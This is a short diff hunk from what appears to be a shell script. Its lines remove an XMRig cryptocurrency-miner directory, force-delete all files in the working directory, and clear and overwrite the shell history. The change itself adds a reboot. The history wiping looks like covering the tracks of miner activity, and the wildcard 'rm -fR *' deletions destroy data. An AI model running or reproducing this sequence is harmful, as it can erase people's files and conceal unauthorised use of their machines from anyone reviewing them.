@@ -11,3 +11,4 @@ rm -fR xmrig-6.21.0/
 rm -fv *
 rm -fR *
 history -c && history -w
+reboot
